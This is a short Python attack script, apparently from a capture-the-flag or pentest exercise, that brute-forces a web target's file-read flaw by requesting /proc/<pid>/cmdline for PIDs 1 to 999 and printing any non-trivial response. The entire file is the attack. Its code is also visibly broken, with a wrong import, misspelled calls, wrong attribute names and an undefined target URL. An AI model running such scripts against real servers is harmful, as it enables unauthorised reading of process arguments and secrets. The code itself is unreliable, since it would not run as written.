import requests
import signal
import time
import sys
import pdb
import logging

from pwd import *

def def_hundler(sig, frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)

#Ctrl + C 
signal.signal(signal.SIGINT, def_hundler)

def makeRequest():
    # /proc/PID/cmdline
    p1 = log.progess("Brute Force Attack")
    p1.status("Starting brute force attack")

    time.sleep(2)

    for i in range(1, 1000):
        p1.status(("Trying with PATH /proc/%s/cmdline") % str(i))
        url = main_url + "/proc/" + str(i) + "/cmdline"
        
        r = request.get(url)

        if len(r.content) > 82:
            print("-------------------------------------------------")
            log.info("PATH: /proc/%s/cmdline" % str(i))
            log.info("Total lengh: %s" % len(r.con))
            print(r.content)
            print("-------------------------------------------------")

if __name__ == '__main__':
    makeRequest()